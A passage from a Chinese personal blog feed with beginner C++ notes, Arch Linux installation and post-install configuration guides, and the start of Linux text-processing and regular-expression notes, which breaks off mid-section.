    <content type="html"><![CDATA[<p><strong>一直想学C++，一直没空，现在闲下来了学习下。</strong></p><p><img src="/images/fj30.jpg"></p><span id="more"></span><h2 id="0-0-C-源文件和编码规范"><a href="#0-0-C-源文件和编码规范" class="headerlink" title="0-0  C++源文件和编码规范"></a>0-0  C++源文件和编码规范</h2><h3 id="1-代码文件"><a href="#1-代码文件" class="headerlink" title="1. 代码文件"></a>1. 代码文件</h3><ul><li>world.h 是头文件</li><li>world.hpp 是头文件</li><li>world.cpp 是源文件</li><li>world.cxx 是源文件</li></ul><h3 id="2-编码规范"><a href="#2-编码规范" class="headerlink" title="2. 编码规范"></a>2. 编码规范</h3><p>为什么要使用编码规范？显然是为了让程序具有更好的可读性</p><p>谷歌开源项目风格指南：<a href="https://github.com/zh-google-styleguide/zh-google-styleguide">https://github.com/zh-google-styleguide/zh-google-styleguide</a></p><h2 id="0-1-Hello-World"><a href="#0-1-Hello-World" class="headerlink" title="0-1 Hello World"></a>0-1 Hello World</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span><span class="hljs-comment">//头文件</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    std::cout&lt;&lt;<span class="hljs-string">&quot;Hello World&quot;</span>&lt;&lt;std::endl;<span class="hljs-comment">//流插入操作符</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<span class="hljs-comment">//返回值</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>不准使用制表符和分页符等特殊字符，IDE中会将制表符设置并替换为四个空格</li><li>函数的返回值必须明确列出，如果不写返回值编译器会默认为int</li></ul><h2 id="0-2-命名空间-namespace"><a href="#0-2-命名空间-namespace" class="headerlink" title="0-2 命名空间(namespace)"></a>0-2 命名空间(namespace)</h2><p>所谓namespace，是指标识符的各种可见范围。C++标准程序库中的所有标识符都被定义于一个名为std的namespace中。<br>一 ：<iostream>和&lt;iostream.h&gt;格式不一样，前者没有后缀，实际上，在你的编译器include文件夹里面可以看到，二者是两个文件，打开文件就会发现，里面的代码是不一样的。后缀为.h的头文件c++标准已经明确提出不支持了，早些的实现将标准库功能定义在全局空间里，声明在带.h后缀的头文件里，c++标准为了和C区别开，也为了正确使用命名空间，规定头文件不使用后缀.h。 因此，当使用&lt;iostream.h&gt;时，相当于在c中调用库函数，使用的是全局命名空间，也就是早期的c++实现；当使用<iostream>的时候，该头文件没有定义全局命名空间，必须使用namespace std；这样才能正确使用cout。<br>二： 由于namespace的概念，使用C++标准程序库的任何标识符时，可以有三种选择：<br>1、直接指定标识符。例如std::iostream而不是iostream。完整语句如下： std::cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; std::endl;<br>2、使用using关键字。 using std::cout; using std::endl; using std::cin; 以上程序可以写成 cout &lt;&lt; std::hex &lt;&lt; 3.4 &lt;&lt; endl;<br>3、最方便的就是使用using namespace std **（一般不用）**; 例如： using namespace std;这样命名空间std内定义的所有标识符都有效（曝光）。就好像它们被声明为全局变量一样。那么以上语句可以如下写: cout &lt;&lt;hex &lt;&lt; 3.4 &lt;&lt; endl;**因为标准库非常的庞大，所以程序员在选择的类的名称或函数名时就很有可能和标准库中的某个名字相同。**所以为了避免这种情况所造成的名字冲突，就把标准库中的一切都被放在名字空间std中。但这又会带来了一个新问题。无数原有的C++代码都依赖于使用了多年的伪标准库中的功能，他们都是在全局空间下的。所以就有了&lt;iostream.h&gt;和<iostream>等等这样的头文件，一个是为了兼容以前的C++代码，一个是为了支持新的标准。命名空间std封装的是标准程序库的名称，标准程序库为了和以前的头文件区别，一般不加”.h”。</p><h4 id="有无命名空间的区别："><a href="#有无命名空间的区别：" class="headerlink" title="有无命名空间的区别："></a>有无命名空间的区别：</h4><p><img src="/images/Cplus0-0.png"></p><h2 id="0-3-编译C-程序"><a href="#0-3-编译C-程序" class="headerlink" title="0-3 编译C++程序"></a>0-3 编译C++程序</h2><h3 id="步骤如下："><a href="#步骤如下：" class="headerlink" title="步骤如下："></a>步骤如下：</h3><p><img src="/images/Cplus0-1.png"></p><h2 id="0-4-处理错误"><a href="#0-4-处理错误" class="headerlink" title="0-4 处理错误"></a>0-4 处理错误</h2><h3 id="4-1-错误分类"><a href="#4-1-错误分类" class="headerlink" title="4.1 错误分类"></a>4.1 错误分类</h3><ul><li>Syntax Error（语法错误）</li><li>Runtime Error（运行时错误）</li><li>Logic Error （逻辑错误）</li></ul><p>语法错误就是违反了编程语言的语句形式或者使用规则，一般由编译器检查指出；运行时错误是指程序运行时，遇到一个无法执行的操作，一般编译器无法检查指出；逻辑错误是指程序运行结果与预期的正确结果不一致，编译器无法检查指出。</p><h3 id="4-2-常见语法错误"><a href="#4-2-常见语法错误" class="headerlink" title="4.2 常见语法错误"></a>4.2 常见语法错误</h3><ul><li>写错关键字</li><li>遗漏分号</li><li>遗漏括号</li><li>遗漏引号</li><li>全半角中英文混写</li><li>命名空间引发的错误</li></ul><h2 id="0-5-输入和输出"><a href="#0-5-输入和输出" class="headerlink" title="0-5 输入和输出"></a>0-5 输入和输出</h2><h3 id="5-1-输入输出分类"><a href="#5-1-输入输出分类" class="headerlink" title="5.1 输入输出分类"></a>5.1 输入输出分类</h3><ul><li>标准IO</li><li>文件IO</li><li>字符串IO</li><li>网络IO</li></ul><h3 id="5-2-C-的输入和输出"><a href="#5-2-C-的输入和输出" class="headerlink" title="5.2 C++的输入和输出"></a>5.2 C++的输入和输出</h3><p>C++使用一种叫做“流”的概念对屏幕、键盘或者文件进行输入输出操作</p><p><img src="/images/Cplus0-2.png"></p><p><img src="/images/Cplus0-3.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ArchLinux安装后的一些配置</title>
    <link href="/blog/2020/02/05/ArchLinux%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/"/>
    <url>/blog/2020/02/05/ArchLinux%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p><strong>前几天安装好了Arch Linux的基础包部分，现在试着配置一下我们安装好的系统</strong></p><p><img src="/images/fj29.jpg"></p><span id="more"></span><h2 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h2><p>在这之前所有操作都是以root用户的身份进行的，由于root的权限过高，日常使用root用户是不安全的。Linux为我们提供了强大的用户与组的权限管理，提高了整个系统的安全性。这里我们就来新建一个用户。<br>执行以下命令来创建一个名为xin的用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m -G wheel xin<br></code></pre></td></tr></table></figure><p>在这里稍微解释一下各参数的含义：<br>-m：在创建时同时在&#x2F;home目录下创建一个与用户名同名的文件夹，这个目录就是你的家目录啦！家目录有一个别名是<del>，你可以在任何地方使用</del>来代替家目录路径。这个神奇的目录将会用于存放你所有的个人资料、配置文件等所有跟系统本身无关的资料。这种设定带来了诸多优点：<br>只要家目录不变，你重装系统后只需要重新安装一下软件包（它们一般不存放在家目录），然后所有的配置都会从家目录中读取，完全不用重新设置软件着。<br>你可以在家目录不变的情况下更换你的发行版而不用重新配置你的环境。<br>切换用户后所有的设置会从新的用户的家目录中读取，将不同用户的资料与软件设置等完全隔离。<br>有些著名的配置文件比如vim的配置文件~&#x2F;.vimrc，只要根据自己的使用习惯配置一次， 在另一个Linux系统下（例如你的服务器）把这个文件复制到家目录下，就可以完全恢复你的配置。<br>-G wheel：-G代表把用户加入一个组，对用户与组的概念感兴趣的同学可以自行查找有关资料学习。<br>当然记得为新用户设置一个密码，执行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd xin<br></code></pre></td></tr></table></figure><p>根据提示输入两次密码就可以了，这是用户的密码。</p><h2 id="配置sudo"><a href="#配置sudo" class="headerlink" title="配置sudo"></a>配置sudo</h2><p>我们已经创建好了一个新的用户，以后我们将会使用这个用户来登录，那么我们如果需要执行一些只有root用户才能执行的命令，有一个简单的办法就是使用<strong>sudo</strong>。</p><p>sudo本身也是一个软件包，我们可以通过pacman来安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pacman -S sudo<br></code></pre></td></tr></table></figure><p>接下来我们需要修改sudo的配置文件，教程上面说的是使用visudo，可是我不能用，于是我手动找到了sudo的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/sudoers<br></code></pre></td></tr></table></figure><p>编辑之后发现这是一个只读文件，于是退出重来：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +w /etc/sudoers<br>vim /etc/sudoers<br><span class="hljs-built_in">chmod</span> -w /etc/sudoers<br></code></pre></td></tr></table></figure><p>编辑时找到# %wheel ALL&#x3D;(ALL)ALL这一行，将前面的#去掉即可</p><p>最后记得将配置文件恢复成只读，为了安全考虑。图如下：</p><p><img src="/images/archlinux3.png"></p><p>配置好sudo后，输入reboot命令重启，输入刚创建的用户名密码即可登录。</p><h2 id="图形界面的安装"><a href="#图形界面的安装" class="headerlink" title="图形界面的安装"></a>图形界面的安装</h2><h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>如果是因特尔的集成显卡就可执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S xf86-video-intel<br><br></code></pre></td></tr></table></figure><h3 id="安装Xorg"><a href="#安装Xorg" class="headerlink" title="安装Xorg"></a>安装Xorg</h3><p>Xorg是Linux下的一个著名的开源图形服务，我们的桌面环境需要Xorg的支持。<br>执行如下命令安装Xorg及相关组件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S xorg<br></code></pre></td></tr></table></figure><h3 id="安装桌面环境"><a href="#安装桌面环境" class="headerlink" title="安装桌面环境"></a>安装桌面环境</h3><p>Linux下有很多著名的桌面环境如Xfce、KDE(Plasma)、Gnome、Unity、Deepin等等，它们的外观、操作、设计理念等各方面都有所不同， 在它们之间的比较与选择网上有很多的资料可以去查。</p><h4 id="安装Xfce"><a href="#安装Xfce" class="headerlink" title="安装Xfce"></a>安装Xfce</h4><p>直接安装软件包组即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S xfce4 xfce4-goodies<br></code></pre></td></tr></table></figure><h4 id="安装KDE（Plasma）"><a href="#安装KDE（Plasma）" class="headerlink" title="安装KDE（Plasma）"></a>安装KDE（Plasma）</h4><p>直接安装软件包组合：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S plasma kde-applications <br></code></pre></td></tr></table></figure><h3 id="安装桌面管理器"><a href="#安装桌面管理器" class="headerlink" title="安装桌面管理器"></a>安装桌面管理器</h3><p>安装好了桌面环境包以后，我们需要安装一个图形化的桌面管理器来帮助我们登录并且选择我们使用的桌面环境，这里我推荐使用sddm。</p><h4 id="安装sddm"><a href="#安装sddm" class="headerlink" title="安装sddm"></a>安装sddm</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S sddm<br></code></pre></td></tr></table></figure><h4 id="设置开机启动sddm服务"><a href="#设置开机启动sddm服务" class="headerlink" title="设置开机启动sddm服务"></a>设置开机启动sddm服务</h4><p>这里就要介绍一下Arch下用于管理系统服务的命令systemctl了，服务的作用就是字面意思，为我们提供特定的服务，比如sddm就为我们提供了启动xorg与管理桌面环境的服务。<br>命令的使用并不复杂：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl start   服务名 （启动一项服务）<br>sudo systemctl stop    服务名 （停止一项服务）<br>sudo systemctl <span class="hljs-built_in">enable</span>  服务名 （开机启动一项服务）<br>sudo systemctl <span class="hljs-built_in">disable</span> 服务名 （取消开机启动一项服务）<br></code></pre></td></tr></table></figure><p>执行以下命令设置开机启动sddm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> sddm<br></code></pre></td></tr></table></figure><h3 id="提前配置网络"><a href="#提前配置网络" class="headerlink" title="提前配置网络"></a>提前配置网络</h3><p>到现在我们已经安装好了桌面环境，但是还有一件事情需要我们提前设置一下。由于我们之前使用的一直都是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以我们需要禁用netctl并启用NetworkManager：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">disable</span> netctl<br>sudo systemctl <span class="hljs-built_in">enable</span> NetworkManager （注意大小写）<br></code></pre></td></tr></table></figure><p>同时我们可以安装一个工具栏网络显示图标：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S network-manager-applet<br></code></pre></td></tr></table></figure><p>重新启动之后就看到我们安装的桌面啦：</p><p><img src="/images/archlinux4.png"></p><h2 id="安装vmtools（虚拟机工具）"><a href="#安装vmtools（虚拟机工具）" class="headerlink" title="安装vmtools（虚拟机工具）"></a>安装vmtools（虚拟机工具）</h2><p>安装vmtools的时候发现按照以往的安装方法并不适用，一直提示找不到rc0.d到rc6.d，查阅资料后发现这些文件为各启动级别的启动脚本，ArchLinux并不是以此方式启动的，因此不能使用vmware自带的安装包安装，经过查阅资料我们可以安装一个开源的工具包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pacman -S open-vm-tools<br></code></pre></td></tr></table></figure><p>后面出了点问题，找不到vmtoolsd这个服务，还没解决。解决以后再写，</p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ArchLinux初体验</title>
    <link href="/blog/2020/02/02/ArchLinux%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <url>/blog/2020/02/02/ArchLinux%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<p><strong>有时间玩一些好玩的了，听说亲手弄一个Arch Linux是一个很有成就感的事情，说干就干，记录一下配置的过程吧。</strong></p><p><img src="/images/fj26.jpg"></p><span id="more"></span><h2 id="ArchLinux安装"><a href="#ArchLinux安装" class="headerlink" title="ArchLinux安装"></a>ArchLinux安装</h2><h3 id="开始分区"><a href="#开始分区" class="headerlink" title="开始分区"></a>开始分区</h3><p><strong>查看目前的分区情况：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l<br></code></pre></td></tr></table></figure><p><img src="/images/archlinux1.png"></p><p>可以看到我的一块20GB的磁盘空间，并且没有进行任何分区（虚拟机分配的）</p><p><strong>创建一个根分区：</strong></p><p>输入命令：<strong>fdisk &#x2F;dev&#x2F;sda</strong></p><ol><li>如果是一块全新硬盘，而且是BIOS&#x2F;MBR引导方式，输入o来创建一个新的MBR分区表</li><li>输入n创建一个新的分区，适当选择相应的分区选项</li><li>输入p查看新建的分区</li><li>输入w来讲之前所有的操作写入磁盘生效</li><li>输入以下命令格式化更创建的根分区：mkfs.ext4 &#x2F;dev&#x2F;sda1</li></ol><p><strong>挂载分区：</strong> mount  &#x2F;dev&#x2F;sda1 &#x2F;mnt</p><h3 id="连接网络"><a href="#连接网络" class="headerlink" title="连接网络"></a>连接网络</h3><p>现在我们是在新安装的系统上进行操作，所以我们要重新联网，我们在安装系统时已经提前装好了相关的包，所以我们需要测试一下是否正常连接网络：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping www.baidu.com<br></code></pre></td></tr></table></figure><p>如果你使用的有线网络并且路由器支持DHCP，那么插上网线就可正常使用网络。</p><h3 id="安装基本包"><a href="#安装基本包" class="headerlink" title="安装基本包"></a>安装基本包</h3><p><strong>选择镜像源</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/pacman.d/mirrorlist<br></code></pre></td></tr></table></figure><p>将清华和浙大的源放进最开始的地方（优先级高）</p><p>Server &#x3D; <a href="http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch">http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch</a><br>Server &#x3D; <a href="http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch">http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch</a></p><p><strong>安装基本包</strong></p><p>pacstrap &#x2F;mnt base base-devel linux linux-firmware dhcpcd</p><p><strong>配置Fstab</strong></p><p>生成自动挂载分区的fstab文件，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">genfstab -L /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p>由于这步比较重要，所以我们需要输出生成的文件来检查是否正确，执行以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /mnt/etc/fstab<br></code></pre></td></tr></table></figure><p><strong>Chroot</strong></p><p>Chroot意为Change root，相当于把操纵权交给我们新安装（或已经存在）的Linux系统，执行了这步以后，我们的操作都相当于在磁盘上新装的系统中进行。</p><p>执行如下命令：</p><p><strong>arch-chroot &#x2F;mnt</strong></p><h2 id="ArchLinux安装后一些必要的配置"><a href="#ArchLinux安装后一些必要的配置" class="headerlink" title="ArchLinux安装后一些必要的配置"></a>ArchLinux安装后一些必要的配置</h2><h3 id="创建交换文件"><a href="#创建交换文件" class="headerlink" title="创建交换文件"></a>创建交换文件</h3><p>交换文件可以在物理内存不足的时候将部分内存暂存到交换文件中，避免系统由于内存不足而完全停止工作。<br>之前我们通常采用单独一个分区的方式作为交换分区，现在更推荐采用交换文件的方式，更便于我们的管理。<br>分配一块空间用于交换文件，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fallocate -l 768M /swapfile<br></code></pre></td></tr></table></figure><p>更改权限，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 /swapfile<br></code></pre></td></tr></table></figure><p>设置交换文件，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /swapfile<br></code></pre></td></tr></table></figure><p>启用交换文件，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">swapon /swapfile<br></code></pre></td></tr></table></figure><p>最后我们需要编辑&#x2F;etc&#x2F;fstab为交换文件设置一个入口，使用vim打开文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/fstab<br></code></pre></td></tr></table></figure><p>在最后一行添加以下内容：</p><p><strong>&#x2F;swapfile none swap defaults 0 0</strong></p><h3 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h3><p>依次执行如下命令设置我们的时区为上海并生成相关文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime<br>hwclock --systohc<br></code></pre></td></tr></table></figure><h3 id="设置Locale"><a href="#设置Locale" class="headerlink" title="设置Locale"></a>设置Locale</h3><p>设置我们使用的语言选项，执行如下命令来编辑&#x2F;etc&#x2F;locale.gen文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/locale.gen<br></code></pre></td></tr></table></figure><p>在文件中找到zh_CN.UTF-8 UTF-8 zh_HK.UTF-8 UTF-8 zh_TW.UTF-8 UTF-8 en_US.UTF-8 UTF-8这四行，去掉行首的#号，保存并退出。</p><p>然后执行： locale-gen</p><p>打开（不存在时会创建）&#x2F;etc&#x2F;locale.conf文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/locale.conf<br></code></pre></td></tr></table></figure><p>在文件的第一行加入以下内容：</p><p>LANG&#x3D;en_US.UTF-8</p><p>保存并退出。</p><h3 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h3><p>打开（不存在时会创建）&#x2F;etc&#x2F;hostname文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hostname<br></code></pre></td></tr></table></figure><p>在文件的第一行输入你自己设定的一个myhostname，我设置的时xin，保存并退出。</p><p>编辑&#x2F;etc&#x2F;hosts文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>在文件末添加如下内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1localhost<br>::1    localhost<br>127.0.1.1xin.localdomainxin<br></code></pre></td></tr></table></figure><h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>Root是Linux中具有最高权限帐户，有些敏感的操作必须通过Root用户进行，比如使用pacman，我们之前进行所有的操作也都是以Root用户进行的，也正是因为Root的权限过高，如果使用不当会造成安全问题，所以我们之后会新建一个普通用户来进行日常的操作。在这里我们需要为Root帐户设置一个密码：</p><p>执行以下命令：</p><p><strong>passwd</strong></p><p>按照提示操作。</p><h3 id="安装Intel-ucode（非IntelCPU可以跳过此步骤）"><a href="#安装Intel-ucode（非IntelCPU可以跳过此步骤）" class="headerlink" title="安装Intel-ucode（非IntelCPU可以跳过此步骤）"></a>安装Intel-ucode（非IntelCPU可以跳过此步骤）</h3><p>执行命令：<strong>pacman -S intel-ucode</strong></p><h3 id="安装Bootloader"><a href="#安装Bootloader" class="headerlink" title="安装Bootloader"></a>安装Bootloader</h3><ul><li><p>首先安装os-prober和ntfs-3g这两个包，它可以配合Grub检测已经存在的系统，自动设置启动选项。命令如下：pacman -S os-prober ntfs-3g</p></li><li><ul><li>安装grub包：</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S grub</span><br></code></pre></td></tr></table></figure><ul><li>部署grub：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-install --target=i386-pc /dev/sda （将sdx换成你安装的硬盘）<br></code></pre></td></tr></table></figure><p>注意这里的sdx应该为硬盘（例如<code>/dev/sda</code>），<strong>而不是</strong>形如<code>/dev/sda1</code>这样的分区。</p><ul><li>生成配置文件：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure></li></ul><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p>exit退出后，umount &#x2F;mnt 后reboot即可进入新的操作系统。</p><p><img src="/images/archlinux2.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux开发与应用</title>
    <link href="/blog/2020/01/19/Linux%E5%BC%80%E5%8F%91%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
    <url>/blog/2020/01/19/Linux%E5%BC%80%E5%8F%91%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>趁着假期没有事情做，具体的学习一下Linux在实际使用时的常用技巧。</strong></p><p><img src="/images/fj28.jpg"></p><span id="more"></span><h2 id="系统状态查看工具"><a href="#系统状态查看工具" class="headerlink" title="系统状态查看工具"></a>系统状态查看工具</h2><h3 id="文本文件的处理"><a href="#文本文件的处理" class="headerlink" title="文本文件的处理"></a>文本文件的处理</h3><h4 id="1-重定向与管道"><a href="#1-重定向与管道" class="headerlink" title="1.重定向与管道"></a>1.重定向与管道</h4><p>重定向机制：</p><ul><li><p>输出重定向，将ls的输出放到文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l &gt; filelist.txt<br></code></pre></td></tr></table></figure></li><li><p>输入重定向，将文件中的内容放到命令行中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sort</span> &lt; filelist.txt<br></code></pre></td></tr></table></figure></li></ul><p>管道机制，可以组合命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l | <span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure><h4 id="2-文本文件处理命令的特点"><a href="#2-文本文件处理命令的特点" class="headerlink" title="2.文本文件处理命令的特点"></a>2.文本文件处理命令的特点</h4><ul><li>不指定处理对象文件名时，从标准输入获得数据</li><li>指定处理对象文件名时，从文件中获取数据</li><li>多数命令可以指定多个文件</li><li>处理结果在标准输出显示</li></ul><h4 id="3-文本文件读取与处理的命令"><a href="#3-文本文件读取与处理的命令" class="headerlink" title="3.文本文件读取与处理的命令"></a>3.文本文件读取与处理的命令</h4><ul><li>more&#x2F;less：逐屏显示文件</li><li>cat与od：列出文件内容</li><li>head与tail：显示文件头部或者尾部</li><li>tee：tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件</li><li>wc：字计数</li><li>sort：对文件内容排序</li><li>tr：翻译字符</li><li>uniq：筛选文件中的重复行</li></ul><h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="概念和相关命令"><a href="#概念和相关命令" class="headerlink" title="概念和相关命令"></a>概念和相关命令</h3><h4 id="1-正则表达式概念"><a href="#1-正则表达式概念" class="headerlink" title="1.正则表达式概念"></a>1.正则表达式概念</h4><p>是字符串匹配操作和替换操作。</p><h4 id="2-正则表达式的特殊字符"><a href="#2-正则表达式的特殊字符" class="headerlink" title="2.正则表达式的特殊字符"></a>2.正则表达式的特殊字符</h4><ul><li>六个元字符：. * [ \ ^ $</li><li>其他字符与其自身匹配</li><li>转义：用反斜线可以取消特殊字符的特殊含义</li></ul><h4 id="3-定义集合"><a href="#3-定义集合" class="headerlink" title="3.定义集合"></a>3.定义集合</h4><ul><li>在一对方括号之间的字符为集合的内容</li><li>圆点，星号，反斜线在方括号内时代表他们自己</li><li>可以用 - 定义一个区间，如[a-z]</li><li>[][] [][]集合含左右中括号两个字符</li><li>减号在最后，则失去表示区间的意义</li></ul><h4 id="4-单字符正则表达式的组合"><a href="#4-单字符正则表达式的组合" class="headerlink" title="4.单字符正则表达式的组合"></a>4.单字符正则表达式的组合</h4><p>锚点：$与^</p><ul><li>$在尾部时有特殊意义，否则与自身匹配，例如123$匹配文件行末尾的123匹配，$123与字符串$123匹配</li><li>^在首部时有特殊意义，否则与自身匹配。</li></ul><h4 id="5-对基本正则表达式进行了改进"><a href="#5-对基本正则表达式进行了改进" class="headerlink" title="5.对基本正则表达式进行了改进"></a>5.对基本正则表达式进行了改进</h4><ul><li>表示分组：()圆括号，(xy)*可匹配空字符串，xy，xyxy，xyxyxy</li><li>表示逻辑运算：表示逻辑或的符号|    (pink|green)表示与pink或者green匹配</li><li>重复次数的定义：与星号地位类似的+和?，*表示它左边的单字符正则表达式的0次或多次重复，+号表示1次或多次，?表示0次或者一次</li></ul><h3 id="正则表达式的应用"><a href="#正则表达式的应用" class="headerlink" title="正则表达式的应用"></a>正则表达式的应用</h3><h4 